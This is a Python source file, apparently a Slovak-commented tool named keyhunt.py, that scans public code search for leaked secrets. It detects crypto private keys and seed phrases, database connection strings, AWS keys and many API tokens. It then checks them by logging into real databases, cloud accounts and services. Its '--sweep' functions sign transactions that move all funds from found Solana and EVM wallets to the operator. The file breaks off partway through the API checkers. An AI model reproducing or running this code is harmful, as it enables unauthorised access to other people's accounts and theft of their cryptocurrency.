#!/usr/bin/env python3
"""
keyhunt.py v4 — celosvetovy skener uniknutych tajomstiev. Production ready.

GitHub + grep.app -> krypto kluce, DB pristupy, cloud credentials, API kluce.
Co sa da, to AJ OVERI. Volitelne --sweep realne posle prostriedky k tebe.

Read-only, okrem --sweep.
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import json
import os
import re
import sqlite3
import time
from dataclasses import dataclass
from urllib.parse import urlparse, unquote

import aiohttp
import base58 as b58
from aiohttp import BasicAuth
from bip_utils import (Bip39MnemonicValidator, Bip39SeedGenerator,
                       Bip44, Bip44Coins, Bip44Changes,
                       Bip84, Bip84Coins)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.hash import Hash
from solders.message import MessageV0
from solders.transaction import VersionedTransaction
from solders.system_program import transfer, TransferParams

OPTIONAL = ("psycopg2", "pymysql", "redis", "pymongo", "boto3", "eth_account")
for _m in OPTIONAL:
    try:
        __import__(_m)
    except Exception:
        print(f"[!] chýba voliteľný modul: {_m}")

try:
    from bip_utils import Bip39WordsListGetter, Bip39Languages
    BIP39_WORDS = set(Bip39WordsListGetter().GetByLanguage(Bip39Languages.ENGLISH))
except Exception:
    BIP39_WORDS = set()

# ------------------------------------------------------------------ config
GH_TOKEN      = os.environ.get("GITHUB_TOKEN", "")
TG_TOKEN      = os.environ.get("TG_TOKEN", "")
TG_CHAT       = os.environ.get("TG_CHAT", "")
DB_PATH       = os.environ.get("KEYHUNT_DB", "keyhunt.db")
REFRESH_HOURS = int(os.environ.get("KEYHUNT_REFRESH_HOURS", "72"))
TIMEOUT       = int(os.environ.get("KEYHUNT_TIMEOUT", "8"))

TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
SYSTEM_PROGRAM = "11111111111111111111111111111111"
SOL_FEE = 5000

SOL_RPCS = ["https://api.mainnet-beta.solana.com",
            "https://solana-rpc.publicnode.com",
            "https://rpc.ankr.com/solana"]

EVM_RPCS = {
    "eth":      ["https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
    "bsc":      ["https://bsc-rpc.publicnode.com", "https://binance.llamarpc.com"],
    "polygon":  ["https://polygon-rpc.com", "https://polygon-bor-rpc.publicnode.com"],
    "arbitrum": ["https://arb1.arbitrum.io/rpc", "https://arbitrum-one-rpc.publicnode.com"],
    "base":     ["https://mainnet.base.org", "https://base-rpc.publicnode.com"],
}
EVM_CHAINID = {"eth": 1, "bsc": 56, "polygon": 137, "arbitrum": 42161, "base": 8453}

ERC20 = {
    "eth":      [("0xdAC17F958D2ee523a2206206994597C13D831ec7", 6, "USDT"),
                 ("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6, "USDC")],
    "bsc":      [("0x55d398326f99059fF775485246999027B3197955", 18, "USDT"),
                 ("0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 18, "USDC")],
    "polygon":  [("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6, "USDT"),
                 ("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", 6, "USDC")],
    "arbitrum": [("0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", 6, "USDT"),
                 ("0xaf88d065e77c8cC2239327C5EDb3A432268e5831", 6, "USDC")],
    "base":     [("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 6, "USDC")],
}

ESPLORA  = {"btc": "https://blockstream.info/api",
            "ltc": "https://litecoinspace.org/api"}
TRON_API = "https://api.trongrid.io"

# --- regex krypto
HEX0X = re.compile(r"\b0x([0-9a-fA-F]{64})\b")
HEX64 = re.compile(r"\b([0-9a-fA-F]{64})\b")
ARR   = re.compile(r"\[\s*(?:\d{1,3}\s*,\s*){63}\d{1,3}\s*\]")
B58K  = re.compile(r"\b([1-9A-HJ-NP-Za-km-z]{80,95})\b")
WORDS = re.compile(r"[a-zA-Z]+")
HINT  = re.compile(r"(?i)(private|secret|mnemonic|seed|keypair|deployer|\bkey\b|\bpk\b)")
VALID = Bip39MnemonicValidator()

# --- detektory: (meno, regex, kategoria, ci_overit)
DETECTORS = [
    ("db_postgres",  re.compile(r"postgres(?:ql)?://[^\s\"'<>\\]+"), "db", True),
    ("db_mongo",     re.compile(r"mongodb(?:\+srv)?://[^\s\"'<>\\]+"), "db", True),
    ("db_mysql",     re.compile(r"mysql://[^\s\"'<>\\]+"), "db", True),
    ("db_redis",     re.compile(r"rediss?://[^\s\"'<>\\]+"), "db", True),
    ("aws_pair",     re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"), "aws", True),
    ("ssh_key",      re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"), "other", False),
    ("gcp_sa",       re.compile(r'"type"\s*:\s*"service_account"'), "other", False),
    ("anthropic",    re.compile(r"\bsk-ant-[A-Za-z0-9_\-]{80,}\b"), "api", True),
    ("openrouter",   re.compile(r"\bsk-or-v1-[a-f0-9]{64}\b"), "api", True),
    ("openai",       re.compile(r"\bsk-(?:proj-)?[A-Za-z0-9_\-]{32,}\b"), "api", True),
    ("groq",         re.compile(r"\bgsk_[A-Za-z0-9]{40,}\b"), "api", True),
    ("perplexity",   re.compile(r"\bpplx-[A-Za-z0-9]{40,}\b"), "api", True),
    ("replicate",    re.compile(r"\br8_[A-Za-z0-9]{36,}\b"), "api", True),
    ("huggingface",  re.compile(r"\bhf_[A-Za-z0-9]{30,}\b"), "api", True),
    ("github",       re.compile(r"\b(?:gh[pousr]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,})\b"), "api", True),
    ("gitlab",       re.compile(r"\bglpat-[A-Za-z0-9_\-]{20,}\b"), "api", True),
    ("google",       re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"), "api", True),
    ("stripe",       re.compile(r"\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{20,}\b"), "api", True),
    ("sendgrid",     re.compile(r"\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b"), "api", True),
    ("mailgun",      re.compile(r"\bkey-[0-9a-f]{32}\b"), "api", True),
    ("slack_webhook",re.compile(r"https://hooks\.slack\.com/services/[A-Za-z0-9/+]{40,}"), "api", True),
    ("slack_bot",    re.compile(r"\bxox[baprs]-[A-Za-z0-9\-]{10,}\b"), "api", True),
    ("discord_wh",   re.compile(r"https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+"), "api", True),
    ("telegram_bot", re.compile(r"\b\d{8,10}:[A-Za-z0-9_\-]{35}\b"), "api", True),
    ("digitalocean", re.compile(r"\bdop_v1_[0-9a-f]{64}\b"), "api", True),
    ("netlify",      re.compile(r"\bnfp_[A-Za-z0-9]{40,}\b"), "api", True),
    ("notion",       re.compile(r"\b(?:secret_|ntn_)[A-Za-z0-9]{40,}\b"), "api", True),
    ("linear",       re.compile(r"\blin_api_[A-Za-z0-9]{40,}\b"), "api", True),
    ("npm",          re.compile(r"\bnpm_[A-Za-z0-9]{36}\b"), "api", True),
    ("infura",       re.compile(r"infura\.io/v3/([0-9a-fA-F]{32})"), "api", True),
    ("alchemy",      re.compile(r"alchemy\.com/v2/([A-Za-z0-9_\-]{20,})"), "api", True),
    ("sentry",       re.compile(r"https://[0-9a-f]{32}@o\d+\.ingest\.sentry\.io/\d+"), "api", True),
    ("mapbox",       re.compile(r"\bpk\.[A-Za-z0-9_\-]{60,}\b"), "api", True),
    ("twilio",       re.compile(r"\bSK[0-9a-f]{32}\b"), "other", False),
    ("firebase",     re.compile(r"AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140,}"), "other", False),
]

HINTS = [
    "DATABASE_URL", "postgres://", "mongodb+srv://", "redis://", "mysql://",
    "AWS_SECRET_ACCESS_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
    "OPENROUTER_API_KEY", "GROQ_API_KEY", "REPLICATE_API_TOKEN",
    "PERPLEXITY_API_KEY", "HUGGINGFACE", "GITHUB_TOKEN", "GITLAB_TOKEN",
    "STRIPE_SECRET_KEY", "SENDGRID_API_KEY", "MAILGUN_API_KEY",
    "SLACK_BOT_TOKEN", "DISCORD_WEBHOOK", "TELEGRAM_BOT_TOKEN",
    "DIGITALOCEAN_TOKEN", "NETLIFY_AUTH_TOKEN", "NOTION_TOKEN",
    "LINEAR_API_KEY", "NPM_TOKEN", "INFURA", "ALCHEMY_API_KEY", "SENTRY_DSN",
    "MAPBOX_TOKEN", "GOOGLE_MAPS_API_KEY", "TWILIO_AUTH_TOKEN", "FIREBASE",
    "SOLANA_PRIVATE_KEY", "MNEMONIC", "PRIVATE_KEY", "secretKey",
    "service_account",
]
QUERIES = [f'"{h}" extension:env' if (h.isupper() or "_" in h) else f'"{h}"' for h in HINTS]
QUERIES += ['"postgres://"', '"mongodb+srv://"', '"secretKey" extension:json',
            '"PRIVATE_KEY" extension:env']


# ------------------------------------------------------------------ krypto extrakcia
def find_mnemonics(text: str):
    if len(text) > 4000:
        text = text[:4000]
    w = WORDS.findall(text.lower())
    if len(w) < 12:
        return set()
    if BIP39_WORDS and w[0] not in BIP39_WORDS:
        pass
    out = set()
    for n in (24, 21, 18, 15, 12):
        for i in range(len(w) - n + 1):
            if BIP39_WORDS and (w[i] not in BIP39_WORDS or w[i + n - 1] not in BIP39_WORDS):
                continue
            ph = " ".join(w[i:i + n])
            if VALID.IsValid(ph):
                out.add(ph)
    return out


def _sol_array(m):
    try:
        a = json.loads(m)
        if len(a) == 64 and all(0 <= x <= 255 for x in a):
            return tuple(a)
    except Exception:
        pass
    return None


def find_secrets(text: str):
    out = set()
    for line in text.splitlines():
        hot = bool(HINT.search(line))
        if hot:
            for m in HEX0X.findall(line) + HEX64.findall(line):
                out.add(("hex", m))
            for m in B58K.findall(line):
                try:
                    if len(b58.b58decode(m)) == 64:
                        out.add(("sol_b58", m))
                except Exception:
                    pass
        for m in ARR.findall(line):
            v = _sol_array(m)
            if v:
                out.add(("sol_array", v))
        if hot and len(line.split()) >= 12:
            for m in find_mnemonics(line):
                out.add(("mnemonic", m))
        if hot:
            for m in HEX0X.findall(line):
                out.add(("hex", m))
    return out


def _strip_url(u: str) -> str:
    return u.rstrip(')]},;\\\'"')


def find_other_secrets(text: str):
    out = {}
    for name, rx, cat, check in DETECTORS:
        for m in rx.finditer(text):
            val = m.group(1) if m.groups() else m.group(0)
            if cat == "db":
                val = _strip_url(val)
            if val not in out:
                out[val] = {"name": name, "cat": cat, "check": check}
    m = re.search(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b", text)
    if m:
        sm = re.search(r"(?i)aws[_\-]?secret[_\-]?access[_\-]?key[^\n]{0,15}?"
                       r"[\"'=\s]+([A-Za-z0-9/+=]{40})", text)
        if sm:
            out[f"{m.group(0)}:{sm.group(1)}"] = {"name": "aws_pair", "cat": "aws", "check": True}
    return out


# ------------------------------------------------------------------ targety
@dataclass
class Target:
    addr: str
    chain: str
    kind: str
    secret: str
    repo: str
    path: str
    index: int


def derive_targets(kind, secret, repo, path, max_index, chains):
    out = []
    def mk(a, c, i):
        if a:
            out.append(Target(a, c, kind, secret, repo, path, i))

    if kind == "hex":
        try:
            kb = bytes.fromhex(secret)
            if "evm" in chains:
                try:
                    mk(Bip44.FromPrivateKey(kb, Bip44Coins.ETHEREUM)
                       .PublicKey().ToAddress(), "evm:eth", 0)
                except Exception:
                    pass
            if "sol" in chains:
                try:
                    mk(str(Keypair.from_seed(kb).pubkey()), "solana", 0)
                except Exception:
                    pass
        except Exception:
            pass
        return out

    if kind in ("sol_array", "sol_b58"):
        if "sol" in chains:
            try:
                raw = bytes(secret) if kind == "sol_array" else b58.b58decode(secret)
                mk(str(Keypair.from_bytes(raw).pubkey()), "solana", 0)
            except Exception:
                pass
        return out

    try:
        seed = Bip39SeedGenerator(secret).Generate()
    except Exception:
        return out

    for i in range(max_index + 1):
        if "sol" in chains:
            try:
                k = (Bip44.FromSeed(seed, Bip44Coins.SOLANA).Purpose().Coin()
                     .Account(i).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0))
                mk(b58.b58encode(k.PublicKey().RawCompressed().ToBytes()[1:]).decode(), "solana", i)
            except Exception:
                pass
        if "evm" in chains:
            try:
                a = (Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).Purpose().Coin()
                     .Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                     .PublicKey().ToAddress())
                for ch in EVM_RPCS:
                    mk(a, f"evm:{ch}", i)
            except Exception:
                pass
        if "btc" in chains:
            for cls, coins in ((Bip44, Bip44Coins.BITCOIN),
                               (Bip84, Bip84Coins.BITCOIN)):
                try:
                    mk(cls.FromSeed(seed, coins).Purpose().Coin().Account(0)
                       .Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                       .PublicKey().ToAddress(), "btc", i)
                except Exception:
                    pass
        if "ltc" in chains:
            try:
                mk(Bip44.FromSeed(seed, Bip44Coins.LITECOIN).Purpose().Coin()
                   .Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                   .PublicKey().ToAddress(), "ltc", i)
            except Exception:
                pass
        if "tron" in chains:
            try:
                mk(Bip44.FromSeed(seed, Bip44Coins.TRON).Purpose().Coin()
                   .Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                   .PublicKey().ToAddress(), "tron", i)
            except Exception:
                pass
    return out


def privkey_for(hit):
    """Vráti privátny kľúč pre sweep. None ak sa nedá."""
    kind, secret, idx = hit["kind"], hit["secret"], hit["index"]
    try:
        if kind == "mnemonic":
            seed = Bip39SeedGenerator(secret).Generate()
            if hit["chain"] == "solana":
                return ("sol", (Bip44.FromSeed(seed, Bip44Coins.SOLANA).Purpose().Coin()
                                .Account(idx).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
                                .PrivateKey().Raw().ToBytes()))
            return ("evm", (Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).Purpose().Coin()
                            .Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(idx)
                            .PrivateKey().Raw().ToBytes()))
        if kind == "hex":
            kb = bytes.fromhex(secret)
            return ("sol" if hit["chain"] == "solana" else "evm", kb)
        if kind == "sol_array":
            return ("sol", bytes(secret)[:32])
        if kind == "sol_b58":
            return ("sol", b58.b58decode(secret)[:32])
    except Exception:
        return None
    return None


# ------------------------------------------------------------------ cache
class Cache:
    def __init__(self, path):
        self.db = sqlite3.connect(path)
        self.db.execute("CREATE TABLE IF NOT EXISTS seen"
                        "(addr TEXT PRIMARY KEY, chain TEXT, bal REAL, ts INTEGER)")
        self.db.execute("CREATE TABLE IF NOT EXISTS swept"
                        "(addr TEXT PRIMARY KEY, tx TEXT, ts INTEGER)")
        self.db.commit()

    def prev(self, addr):
        """Vráti (existuje_zaznam, bal) — rozlíši 'nikdy' od 'expirované'."""
        row = self.db.execute("SELECT ts, bal FROM seen WHERE addr=?", (addr,)).fetchone()
        if not row:
            return False, None
        ts, bal = row
        if time.time() - ts > REFRESH_HOURS * 3600:
            return False, None
        return True, bal

    def put(self, addr, chain, bal):
        self.db.execute("INSERT OR REPLACE INTO seen VALUES(?,?,?,?)",
                        (addr, chain, bal, int(time.time())))
        self.db.commit()

    def was_swept(self, addr):
        return self.db.execute("SELECT 1 FROM swept WHERE addr=?", (addr,)).fetchone() is not None

    def mark_swept(self, addr, tx):
        self.db.execute("INSERT OR REPLACE INTO swept VALUES(?,?,?)",
                        (addr, tx, int(time.time())))
        self.db.commit()


# ------------------------------------------------------------------ balances
class Checker:
    def __init__(self, session, cache):
        self.s = session
        self.sem = asyncio.Semaphore(24)
        self.cache = cache
        self.hits = {}
        self.checked = 0
        self._by_addr = {}

    async def rpc(self, urls, payload):
        for u in urls:
            for attempt in (0, 1):
                try:
                    async with self.sem:
                        async with self.s.post(u, json=payload,
                                               timeout=aiohttp.ClientTimeout(total=30)) as r:
                            if r.status == 200:
                                return await r.json()
                except Exception:
                    await asyncio.sleep(1 + attempt)
        return None

    def _t(self, ts, addr):
        if addr not in self._by_addr:
            self._by_addr[addr] = next((t for t in ts if t.addr == addr), None)
        return self._by_addr[addr]

    def record(self, t, bal, note=""):
        if t is None:
            return
        self.checked += 1
        found, was = self.cache.prev(t.addr)
        self.cache.put(t.addr, t.chain, bal)
        if bal <= 0:
            return
        is_new = (not found) or (was == 0.0)
        self.hits[t.addr] = {"chain": t.chain, "balance": bal, "note": note,
                             "kind": t.kind, "secret": t.secret, "repo": t.repo,
                             "path": t.path, "index": t.index, "is_new": is_new}

    async def sol_native(self, ts):
        self._by_addr = {t.addr: t for t in ts}
        a = list(self._by_addr)
        for i in range(0, len(a), 100):
            ch = a[i:i + 100]
            res = await self.rpc(SOL_RPCS, {"jsonrpc": "2.0", "id": 1,
                                            "method": "getMultipleAccounts",
                                            "params": [ch, {"encoding": "base64"}]})
            if not res:
                continue
            for addr, acc in zip(ch, res.get("result", {}).get("value", [])):
                if acc and acc.get("lamports", 0) > 0:
                    self.record(self._by_addr.get(addr), acc["lamports"] / 1e9)

    async def sol_tokens(self, ts):
        a = list({t.addr: t for t in ts})
        for i in range(0, len(a), 40):
            ch = a[i:i + 40]
            batch = [{"jsonrpc": "2.0", "id": j, "method": "getTokenAccountsByOwner",
                      "params": [o, {"programId": TOKEN_PROGRAM}, {"encoding": "jsonParsed"}]}
                     for j, o in enumerate(ch)]
            res = await self.rpc(SOL_RPCS, batch)
            if not res:
                continue
            for item in res:
                if not isinstance(item, dict) or "result" not in item:
                    continue
                o = ch[item["id"]]
                n = 0
                for acc in item["result"].get("value", []):
                    try:
                        ui = float(acc["account"]["data"]["parsed"]["info"]
                                   ["tokenAmount"]["uiAmountString"] or 0)
                        if ui > 0:
                            n += 1
                    except Exception:
                        pass
                if n:
                    t = next((x for x in ts if x.addr == o), None)
                    if t:
                        self.hits.setdefault(o, {"chain": "solana-token", "balance": 0.0,
                                                 "note": f"{n} SPL tokenov", "kind": t.kind,
                                                 "secret": t.secret, "repo": t.repo,
                                                 "path": t.path, "index": t.index,
                                                 "is_new": True})

    async def evm(self, chain, ts):
        urls = EVM_RPCS[chain]
        by = {t.addr: t for t in ts}
        a = list(by)
        for i in range(0, len(a), 50):
            ch = a[i:i + 50]
            batch = [{"jsonrpc": "2.0", "id": j, "method": "eth_getBalance",
                      "params": [x, "latest"]} for j, x in enumerate(ch)]
            res = await self.rpc(urls, batch)
            if not res:
                continue
            for item in res:
                if not isinstance(item, dict) or "result" not in item:
                    continue
                wei = int(item["result"], 16)
                if wei > 0:
                    self.record(by.get(ch[item["id"]]), wei / 1e18)
        for contract, dec, sym in ERC20.get(chain, []):
            for i in range(0, len(a), 50):
                ch = a[i:i + 50]
                batch = [{"jsonrpc": "2.0", "id": j, "method": "eth_call",
                          "params": [{"to": contract,
                                      "data": "0x70a08231" +
                                              x.lower().replace("0x", "").rjust(64, "0")},
                                     "latest"]} for j, x in enumerate(ch)]
                res = await self.rpc(urls, batch)
                if not res:
                    continue
                for item in res:
                    if not isinstance(item, dict) or not item.get("result"):
                        continue
                    v = int(item["result"], 16)
                    if v > 0:
                        t = by.get(ch[item["id"]])
                        if t:
                            self.hits[f"{t.addr}:{sym}"] = {
                                "chain": f"evm:{chain}", "balance": v / 10 ** dec, "note": sym,
                                "kind": t.kind, "secret": t.secret, "repo": t.repo,
                                "path": t.path, "index": t.index, "is_new": True}

    async def esplora(self, chain, ts):
        api = ESPLORA[chain]
        async def one(t):
            try:
                async with self.sem:
                    async with self.s.get(f"{api}/address/{t.addr}",
                                          timeout=aiohttp.ClientTimeout(total=20)) as r:
                        d = await r.json()
            except Exception:
                return
            cs, ms = d.get("chain_stats", {}), d.get("mempool_stats", {})
            bal = (cs.get("funded_txo_sum", 0) - cs.get("spent_txo_sum", 0)
                   + ms.get("funded_txo_sum", 0) - ms.get("spent_txo_sum", 0)) / 1e8
            self.record(t, bal)
        await asyncio.gather(*[one(t) for t in ts])

    async def tron(self, ts):
        async def one(t):
            try:
                async with self.sem:
                    async with self.s.get(f"{TRON_API}/v1/accounts/{t.addr}",
                                          timeout=aiohttp.ClientTimeout(total=20)) as r:
                        d = await r.json()
            except Exception:
                return
            for acc in d.get("data", []):
                if acc.get("balance", 0) > 0:
                    self.record(t, acc["balance"] / 1e6)
        await asyncio.gather(*[one(t) for t in ts])


# ------------------------------------------------------------------ verify
async def last_activity(session, addr, chain):
    try:
        if chain == "solana":
            async with session.post(SOL_RPCS[0], json={
                    "jsonrpc": "2.0", "id": 1, "method": "getSignaturesForAddress",
                    "params": [addr, {"limit": 1}]}) as r:
                res = (await r.json()).get("result", [])
            if res and res[0].get("blockTime"):
                return (time.time() - res[0]["blockTime"]) / 86400
        elif chain.startswith("evm:"):
            async with session.post(EVM_RPCS[chain.split(":", 1)[1]][0], json={
                    "jsonrpc": "2.0", "id": 1, "method": "eth_getTransactionCount",
                    "params": [addr, "latest"]}) as r:
                n = int((await r.json()).get("result", "0x0"), 16)
            return 0.0 if n > 0 else None
        elif chain in ESPLORA:
            async with session.get(f"{ESPLORA[chain]}/address/{addr}/txs?limit=1") as r:
                tx = await r.json()
            if tx and tx[0].get("status", {}).get("block_time"):
                return (time.time() - tx[0]["status"]["block_time"]) / 86400
    except Exception:
        pass
    return None


# ------------------------------------------------------------------ sweep
def _to_thread(fn, *a, **kw):
    return asyncio.wait_for(asyncio.to_thread(fn, *a, **kw), timeout=TIMEOUT + 6)


async def sweep_sol(session, kp, dest, lamports):
    async with session.post(SOL_RPCS[0], json={
            "jsonrpc": "2.0", "id": 1, "method": "getLatestBlockhash",
            "params": [{"commitment": "finalized"}]}) as r:
        bh = (await r.json())["result"]["value"]["blockhash"]
    ix = transfer(TransferParams(from_pubkey=kp.pubkey(),
                                 to_pubkey=Pubkey.from_string(dest),
                                 lamports=lamports))
    msg = MessageV0.try_compile(kp.pubkey(), [ix], [], Hash.from_string(bh))
    tx = VersionedTransaction(msg, [kp])
    raw = base64.b64encode(bytes(tx)).decode()
    async with session.post(SOL_RPCS[0], json={
            "jsonrpc": "2.0", "id": 1, "method": "sendTransaction",
            "params": [raw, {"encoding": "base64"}]}) as r:
        d = await r.json()
    return d.get("result") or ("ERR " + str(d.get("error")))


async def sweep_evm(session, priv, dest, chain):
    from eth_account import Account
    urls = EVM_RPCS[chain]
    acct = Account.from_key(priv)
    async def call(method, params):
        async with session.post(urls[0], json={"jsonrpc": "2.0", "id": 1,
                                               "method": method, "params": params}) as r:
            return (await r.json()).get("result")
    bal = int(await call("eth_getBalance", [acct.address, "latest"]) or "0x0", 16)
    nonce = int(await call("eth_getTransactionCount", [acct.address, "latest"]) or "0x0", 16)
    gas_price = int(await call("eth_gasPrice", []) or "0x0", 16)
    gas = 21000
    value = bal - gas * gas_price
    if value <= 0:
        return None
    tx = {"nonce": nonce, "gasPrice": gas_price, "gas": gas,
          "to": dest, "value": value, "chainId": EVM_CHAINID[chain]}
    signed = acct.sign_transaction(tx)
    raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
    return await call("eth_sendRawTransaction", ["0x" + raw.hex().lstrip("0x")])


# ------------------------------------------------------------------ DB / cloud
def _pg(url):
    import psycopg2
    c = psycopg2.connect(url, connect_timeout=TIMEOUT)
    cur = c.cursor(); cur.execute("select current_database(), version()")
    db, ver = cur.fetchone(); c.close()
    return f"OK db={db} {ver.split(',')[0]}"


def _mysql(url):
    import pymysql
    u = urlparse(url)
    c = pymysql.connect(host=u.hostname, port=u.port or 3306,
                        user=unquote(u.username or ""), password=unquote(u.password or ""),
                        database=(u.path or "/").lstrip("/") or None,
                        connect_timeout=TIMEOUT)
    cur = c.cursor(); cur.execute("select database(), version()")
    db, ver = cur.fetchone(); c.close()
    return f"OK db={db} {ver.split('-')[0]}"


def _mongo(url):
    import pymongo
    c = pymongo.MongoClient(url, serverSelectionTimeoutMS=TIMEOUT * 1000,
                            connectTimeoutMS=TIMEOUT * 1000)
    c.admin.command("ping")
    dbs = c.list_database_names(); c.close()
    return f"OK databázy={','.join(dbs[:6])}"


def _redis(url):
    import redis
    r = redis.from_url(url, socket_connect_timeout=TIMEOUT, socket_timeout=TIMEOUT)
    r.ping(); n = r.dbsize(); ver = r.info("server").get("redis_version", "?")
    r.close()
    return f"OK redis {ver} keys={n}"


async def check_db(url):
    try:
        if url.startswith(("postgres://", "postgresql://")):
            return await _to_thread(_pg, url)
        if url.startswith("mysql://"):
            return await _to_thread(_mysql, url)
        if url.startswith(("mongodb://", "mongodb+srv://")):
            return await _to_thread(_mongo, url)
        if url.startswith(("redis://", "rediss://")):
            return await _to_thread(_redis, url)
    except Exception as e:
        return f"ERR {type(e).__name__}: {str(e)[:70]}"
    return None


def _aws(ak, sk):
    import boto3
    i = boto3.client("sts", aws_access_key_id=ak, aws_secret_access_key=sk,
                     region_name="us-east-1").get_caller_identity()
    return f"OK konto={i['Account']} {i.get('Arn','')[:60]}"


# ------------------------------------------------------------------ API validátory
async def _get(s, url, headers=None, params=None, method="GET", body=None, auth=None):
    for attempt in (0, 1):
        try:
            async with s.request(method, url, headers=headers, params=params, json=body,
                                 auth=auth, timeout=aiohttp.ClientTimeout(total=15)) as r:
                if r.status == 200:
                    return True, r
                if r.status in (429, 402):
                    return True, "limit"
                if r.status in (401, 403):
                    return False, None
        except Exception:
            await asyncio.sleep(1)
    return False, None


async def v_openai(s, k):
    ok, r = await _get(s, "https://api.openai.com/v1/models", {"Authorization": f"Bearer {k}"})
    if ok and r != "limit":
        return True, f"{len((await r.json()).get('data', []))} modelov"
    return ok, "limit" if ok else ""

async def v_anthropic(s, k):
    ok, _ = await _get(s, "https://api.anthropic.com/v1/models",
                       {"x-api-key": k, "anthropic-version": "2023-06-01"})
    return ok, "ok" if ok else ""

async def v_openrouter(s, k):
    ok, r = await _get(s, "https://openrouter.ai/api/v1/key", {"Authorization": f"Bearer {k}"})
    if ok and r != "limit":
        try:
            return True, f"kredit {((await r.json()).get('data') or {}).get('limit_remaining','?')}"
        except Exception:
            return True, "ok"
    return ok, ""

async def v_groq(s, k):
    ok, _ = await _get(s, "https://api.groq.com/openai/v1/models", {"Authorization": f"Bearer {k}"})
    return ok, "ok" if ok else ""

async def v_perplexity(s, k):
    ok, _ = await _get(s, "https://api.perplexity.ai/models", {"Authorization": f"Bearer {k}"})
    return ok, "ok" if ok else ""

async def v_replicate(s, k):
    ok, _ = await _get(s, "https://api.replicate.com/v1/account", {"Authorization": f"Bearer {k}"})
    return ok, "ok" if ok else ""

async def v_hf(s, k):
    ok, r = await _get(s, "https://huggingface.co/api/whoami-v2", {"Authorization": f"Bearer {k}"})
    if ok and r != "limit":
        try:
            return True, (await r.json()).get("name", "ok")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_github(s, k):
    ok, r = await _get(s, "https://api.github.com/user", {"Authorization": f"Bearer {k}"})
    if ok and r != "limit":
        try:
            return True, (await r.json()).get("login", "ok")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_gitlab(s, k):
    ok, r = await _get(s, "https://gitlab.com/api/v4/user", {"PRIVATE-TOKEN": k})
    if ok and r != "limit":
        try:
            return True, (await r.json()).get("username", "ok")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_google(s, k):
    ok, r = await _get(s, "https://maps.googleapis.com/maps/api/geocode/json",
                       params={"address": "Paris", "key": k})
    if ok and r != "limit":
        try:
            return (True, "geocoding OK") if (await r.json()).get("status") == "OK" else (False, "")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_stripe(s, k):
    ok, _ = await _get(s, "https://api.stripe.com/v1/balance", {"Authorization": f"Bearer {k}"})
    return ok, "ok" if ok else ""

async def v_sendgrid(s, k):
    ok, _ = await _get(s, "https://api.sendgrid.com/v3/scopes", {"Authorization": f"Bearer {k}"})
    return ok, "ok" if ok else ""

async def v_mailgun(s, k):
    ok, r = await _get(s, "https://api.mailgun.net/v3/domains", auth=BasicAuth("api", k))
    if ok and r != "limit":
        try:
            return True, f"{len((await r.json()).get('items', []))} domén"
        except Exception:
            return True, "ok"
    return ok, ""

async def v_slack(s, k):
    ok, r = await _get(s, "https://slack.com/api/auth.test", {"Authorization": f"Bearer {k}"})
    if ok and r != "limit":
        try:
            return (True, "ok") if (await r.json()).get("ok") else (False, "")
        except Exception:
            return ok, "ok" if ok else ""
    return ok, ""

async def v_slack_wh(s, url):
    ok, _ = await _get(s, url, method="POST", body={"text": "keyhunt"})
    return ok, "webhook OK" if ok else ""

async def v_discord_wh(s, url):
    ok, r = await _get(s, url)
    if ok and r != "limit":
        try:
            return True, (await r.json()).get("name", "webhook OK")
        except Exception:
            return True, "webhook OK"
    return ok, ""

async def v_telegram(s, k):
    ok, r = await _get(s, f"https://api.telegram.org/bot{k}/getMe")
    if ok and r != "limit":
        try:
            return True, "@" + (await r.json()).get("result", {}).get("username", "ok")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_digitalocean(s, k):
    ok, r = await _get(s, "https://api.digitalocean.com/v2/account", {"Authorization": f"Bearer {k}"})
    if ok and r != "limit":
        try:
            return True, (await r.json()).get("account", {}).get("email", "ok")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_netlify(s, k):
    ok, _ = await _get(s, "https://api.netlify.com/api/v1/accounts", {"Authorization": f"Bearer {k}"})
    return ok, "ok" if ok else ""

async def v_notion(s, k):
    ok, r = await _get(s, "https://api.notion.com/v1/users/me",
                       {"Authorization": f"Bearer {k}", "Notion-Version": "2022-06-28"})
    if ok and r != "limit":
        try:
            return True, (await r.json()).get("name", "ok")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_linear(s, k):
    ok, _ = await _get(s, "https://api.linear.app/graphql", {"Authorization": k},
